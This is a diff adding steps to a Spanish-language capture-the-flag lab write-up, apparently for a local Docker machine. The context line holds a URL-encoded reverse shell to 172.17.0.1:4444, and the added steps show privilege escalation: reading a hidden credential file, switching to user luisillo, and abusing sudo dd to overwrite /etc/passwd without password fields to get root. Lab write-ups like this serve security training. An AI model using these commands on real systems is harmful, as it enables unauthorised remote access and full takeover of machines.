@@ -104,6 +104,49 @@ http://172.17.0.2/?shadow=bash+-c+%27bash+-i+%3E%26+/dev/tcp/172.17.0.1/4444+0%3
 <img width="880" height="158" alt="image" src="https://github.com/user-attachments/assets/16e580a4-0bdd-4a10-9a07-26f09a311b99" />
 
 
+#### 6. Ahora buscaremos escalar privikegios, primero miraremos los binarios que podemos modificar.
+```bash
+sudo -l
+find / -name "*.txt" 2>/dev/null
+```
+
+<img width="889" height="809" alt="image" src="https://github.com/user-attachments/assets/d893e0a1-320a-443b-8c72-1e3246afe6cb" />
+
+#### 6.2 Viendo los binarios podemos ver que en `cat /var/backups/hidden/otro_caramelo.txt` podemos ver un usuario para ascender a el.
+
+
+<img width="900" height="735" alt="image" src="https://github.com/user-attachments/assets/eebc36ea-cbfd-4aaa-8f6d-3483499c39bd" />
+
+
+
+#### 6.3 Escalamos a luisillo.
+
+
+<img width="904" height="661" alt="image" src="https://github.com/user-attachments/assets/896a9007-bd05-4450-bd66-c2d5e98b683e" />
+
+
+#### 7. Ahora miramos sus binarios con `sudo -l`
+
+
+<img width="908" height="175" alt="image" src="https://github.com/user-attachments/assets/67e49e0a-e6d3-4abf-8a81-e352c5afcf7a" />
+
+
+#### 7.2 Ahora vamos a hacer un exploit modificando el `/etc/passwd` para root shell.
+```bash
+cat /etc/passwd > copia.txt
+sed 's/x//g' copia.txt > copia_sin_x.txt
+cat copia_sin_x.txt | sudo /bin/dd of=/etc/passwd
+su
+```
+
+<img width="899" height="226" alt="image" src="https://github.com/user-attachments/assets/15d60744-fc6e-4895-9d48-6144b3f3c453" />
+
+
+
+
+
+
+
 
 
 
